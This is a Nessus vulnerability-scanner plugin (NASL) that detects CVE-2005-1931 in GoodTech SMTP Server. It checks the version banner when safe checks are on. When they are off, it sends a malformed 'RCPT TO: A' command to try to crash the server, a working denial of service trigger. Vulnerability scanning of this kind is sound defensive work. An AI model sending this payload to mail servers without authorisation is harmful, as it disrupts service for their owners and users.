#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18433);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-1931");
  script_bugtraq_id(13888);
  script_xref(name:"OSVDB", value:"17197");

  script_name(english:"GoodTech SMTP Server Malformed RCPT TO Command DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of GoodTech SMTP Server running on the remote host is
prone to a denial of service attacks that can be triggered by sending
a 'RCPT TO' command with the sole argument 'A'." );
 script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2005-June/034457.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to GoodTech SMTP Server 5.15 or newer." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
script_end_attributes();

 
  script_summary(english:"Checks for malformed RCPT TO denial of service vulnerability in GoodTech SMTP Server");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"SMTP problems");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_exclude_keys("SMTP/wrapped");

  exit(0);
}

include("global_settings.inc");
include("smtp_func.inc");
include("misc_func.inc");


port = get_kb_item("Services/smtp");
if (!port) port = 25;
if (!get_port_state(port)) exit(1);
if (get_kb_item('SMTP/'+port+'/broken')) exit(1);


# If the banner suggests it's GoodTech...
banner = get_smtp_banner(port:port);
if (banner && "Simple Mail Transfer Service Ready. Version" >< banner) {
  # If safe checks are enabled...
  if (safe_checks()) {
    # nb: the original advisory only talks about 5.14 as vulnerable, 
    #     but I'd be very surprised if a flaw such as this crept into
    #     just one version. :-)
    if (banner =~ "Version ([0-4]\.|5\.(0|1[0-4][^0-9]))") {
      report = string(
        "Note that Nessus has determined the vulnerability exists on the\n",
        "remote host simply by looking at the installed version number of\n",
        "GoodTech SMTP Server.\n"
      );
      security_warning(port:port, extra:report);
    }
  }
  # Otherwise...
  else {
    # Let's try to crash it.
    soc = smtp_open(port:port, helo:rand_str());
    if (!soc) exit(1);

    c = string("RCPT TO: A");
    send(socket:soc, data:string(c, "\r\n"));
    s = smtp_recv_line(socket:soc);

    # If it's down, try once to reconnect.
    if (!s) {
      close(soc);
      sleep(1);
      # Is the daemon history?
      soc = open_sock_tcp(port);
      if (!soc) {
        security_warning(port);
        exit(0);
      }
    }

    # Let's be nice.
    c = "QUIT";
    send(socket:soc, data:string(c, "\r\n"));
    close(soc);
  }
}
